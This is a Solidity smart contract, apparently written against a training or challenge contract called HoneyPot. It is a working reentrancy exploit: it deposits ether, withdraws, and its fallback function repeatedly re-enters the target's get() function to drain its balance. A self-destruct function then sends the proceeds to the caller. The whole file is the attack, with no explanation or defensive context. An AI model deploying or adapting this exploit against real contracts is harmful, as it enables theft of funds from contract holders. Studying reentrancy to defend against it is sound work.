pragma solidity 0.4.24;

contract ExploitHoneyPot {
    
    HoneyPot public honeyPot;
    uint256 startGas;
    uint256 count = 0;
    
     
    constructor (address addrHoneyPot) public {
        honeyPot = HoneyPot(addrHoneyPot);

    }
    
    function exploit() public payable {
        require (msg.value <= address(honeyPot).balance,"Not enough funds..");
        honeyPot.put.value(msg.value)();

        honeyPot.get();
    }
    
    function kill () public {
        selfdestruct(msg.sender);
    }

    
    function () payable public {
        if (startGas == 0){
                startGas = gasleft();
        }

        if (address(honeyPot).balance >= msg.value && gasleft() >  (startGas - gasleft()) ) {
            honeyPot.get();
        }
    }
}
